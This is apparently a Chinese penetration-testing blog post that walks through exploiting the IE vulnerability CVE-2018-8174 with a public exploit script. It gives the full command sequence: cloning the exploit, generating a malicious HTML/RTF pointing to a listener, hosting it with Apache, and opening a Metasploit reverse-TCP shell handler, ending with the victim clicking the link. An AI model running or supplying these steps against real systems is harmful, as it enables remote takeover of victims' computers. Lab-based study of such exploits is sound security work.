---
title: "0DAY漏洞获取权限"
date: 2020-02-24T17:36:40+08:00
author: 姚先生
categories: ['Kali']
tags: ['安全渗透']
---

利用0day漏洞CVE-2018-8174获取权限

<!--more-->



>在[电脑](https://zh.wikipedia.org/wiki/電腦)领域中，**零日漏洞**或**零时差漏洞**（英语：zero-day vulnerability、0-day vulnerability）通常是指还没有[补丁](https://zh.wikipedia.org/wiki/补丁)的[安全漏洞](https://zh.wikipedia.org/wiki/安全漏洞)，而**零日攻击**或**零时差攻击**（英语：zero-day exploit、zero-day attack）则是指利用这种漏洞进行的攻击。提供该漏洞细节或者利用[程序](https://zh.wikipedia.org/wiki/电脑程序)的人通常是该漏洞的发现者。



## 实验步骤

* CVE-2018-8173_EXP 目标是 IE 浏览器或是IE 内核的浏览器，比如360浏览器

* 安装CVE-2018-8174_EXP

  ~~~
  git clone https://github.com/iBearcat/CVE-2018-8174_EXP.git
  ~~~

* 生成恶意html 文件

  >参数
  >
  >-u URL地址恶意html 文件hack.html 的访问地址
  >
  >-o 生成文档
  >
  >-i 监听地址
  >
  >-p 监听端口

~~~
python CVE-2018-8174.py -u http://192.168.1.130/hack.html -o hack.rtf -i 192.168.1.130 -p 4444
~~~

* 开启WEB服务

~~~
mv exploit.html hack.html
cp hack.html /var/www/html
systemctl start apache2
systemctl enable apache2
~~~

* 打开MSF开启监听

~~~
msfdb run
use /exploit/multi/handler
set payload windows/shell/reverse_tcp
set LHOST 192.168.1.130
run
chcp 65001
background
sessions
~~~

* 受害者点击恶意链接 

